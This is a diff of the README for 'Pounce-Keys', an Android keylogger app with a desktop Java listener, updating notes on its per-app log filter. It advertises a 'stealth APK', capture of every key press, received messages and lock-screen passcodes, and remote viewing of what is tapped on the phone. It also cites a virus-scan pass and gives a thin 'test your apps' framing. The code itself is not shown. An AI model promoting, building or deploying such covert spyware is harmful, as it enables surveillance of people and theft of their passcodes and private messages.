@@ -1,24 +1,13 @@
 ![GitHub all releases](https://img.shields.io/github/downloads/kreabyte/Pounce-Keys/total) ![GitHub commit activity](https://img.shields.io/github/commit-activity/y/kreabyte/Pounce-Keys) ![GitHub](https://img.shields.io/github/license/kreabyte/Pounce-Keys) ![Snyk Vulnerabilities for GitHub Repo](https://img.shields.io/snyk/vulnerabilities/github/kreabyte/Pounce-Keys) [![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FKreaByte%2Fpounce-keys&count_bg=%237E2676&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=Views&edge_flat=false)](https://hits.seeyoufarm.com) ![GitHub Repo stars](https://img.shields.io/github/stars/kreabyte/pounce-keys?style=social)
 
-
+# Updated working filter, see release! 
+no more extra messages in other tabs, now only appends text from logs to respective app tab, my contact is currently in the java file for the listener
+if you would like to request a feature. this filter update was very hard work, please enjoy the update and check it out, night and day difference.
 ![text2photo-92c06359f008719c1d62886d60d75e8a](https://user-images.githubusercontent.com/28081004/214497666-7810e369-d272-4806-96f0-344729a3ec6c.jpeg)
 
-# android-keylogger java listener update! (thank you for my first star! much appreciated, still cleaning things up in here. fixed icon, run jar or exe next to it, updated release.
-# WIP filter update on the way so it appends to respective tab only
-note that it may print logs in all tabs at times but the filter works.
-this is not perfect but i did my best to sort some of the output because at first it printed 1 letter per row reading
-t
-t
-e
-s
-t
-test
-but even worse, so i coded these tabs to wait for a certain word like "Signal" from the logs tab then apend to signal tab then
-  it trys to stop printing in signal tab when it reads keyboard hidden or recent apps to stop the filter.
-   its not perfect but the sorting these tabs do is a huge help in saving time reading logs.
-    its designed to stop printing in certain tabs when the keyboard closes but its not perfect and it will print in all tabs
-     at times but the filters will still work, this is 100 times better than just the logs tab, if youre logs are not showing just wait
-      up to 2 mins. during testing MOST keys stay in their respective tabs. may try to edit the filter some more.
+# android-keylogger java listener update! (thank you for my first star! much appreciated, still cleaning things up in here.
+
+# THE FILTER NOW WORKS 100%, you wont get the same message in all tabs now
 
 # Listener Features
 
@@ -49,10 +38,9 @@ but even worse, so i coded these tabs to wait for a certain word like "Signal" f
 
 no need to build ip or port into apk before install
 
-project was originally built in a AIDE (mobile app dev) using an old 2.2 Gradle build on max API 21 (things are just thrown everywhere right now, I'll clean it up if there's any company, enjoy :)
+project was originally built in a AIDE (mobile app dev) using an old 2.2 Gradle build on max API 21
 
-this version was built in android studio electric eel 2022.1.1 with Gradle updated to 7.6 and API all the way up to 33 (android 13) you can use any listener
-just thought the theme was cool.
+this version was built in android studio electric eel 2022.1.1 with Gradle updated to 7.6 and API all the way up to 33 (android 13)
 
 More than just a keylogger, this app prints most text in whatever active section was tapped or opened/viewed, this is how it can show recieved messages.
 think of this as a text based VNC as it sends all that is tapped on the phone
@@ -79,7 +67,7 @@ normal APK hash b8c49cb5d9e931a2f25898c74a729fe642d725ab9b7878b39a7b46f9fa9e02f5
 
 stealth APK hash aab9a81cb74ee778cfdbbc1ff06d9fb4df04a03752cceb50afc3aee39e7aa5f5 
 
-- [X] PASSED GOOGLE VIRUS SCAN, 2 hits
+✅ PASSED GOOGLE VIRUS SCAN
 
 # NORMAL INSTALL
 
@@ -94,15 +82,17 @@ no manual fix.dat required
 # VIEWING LOGS
 ![Screenshot 2023-01-25 001403](https://user-images.githubusercontent.com/28081004/214485413-54df17f6-7478-4d15-bbe0-da02d2d3618d.png)
 
-new updated logger with gui, see and record each key press in real time
+new updated logger with gui, see and record each key press in real time (precise coded filters per app, will add more upon request or more traffic,
+coding this filter to not throw crap all over the place is hard, THATS WHY WE HAVE POUNCE-KEYS POUNCING ALL OVER THE PLACE.... I'll see myself out
 
 enjoy!
 
 
 
-# ARE YOU'RE APPS VULNERABLE? TEST THEM NOW! Example even CalyxOS lock-sceen is vulnerable, fennec's browser URL tab is protected but not web pages.
-Here is an example of a captured lock screen passcode 1337 and the garbled text is the dots temporarily shown, but it still grabbed it.
-![Screenshot_20230121_092116](https://user-images.githubusercontent.com/28081004/213873317-abffd551-46c0-44c6-a427-b0c6fe9051c4.png)
+# ARE YOU'RE APPS VULNERABLE? TEST THEM NOW! 
+Use Pounce_keys in your dev workflow to assure your app is protected by keyloggers, this is a must for banking apps and yes some are vulnerable!
+Example even CalyxOS lock-sceen is vulnerable, fennec's browser URL tab is protected but not web pages.
+
 
 # dev
 make a new android studio project, empty
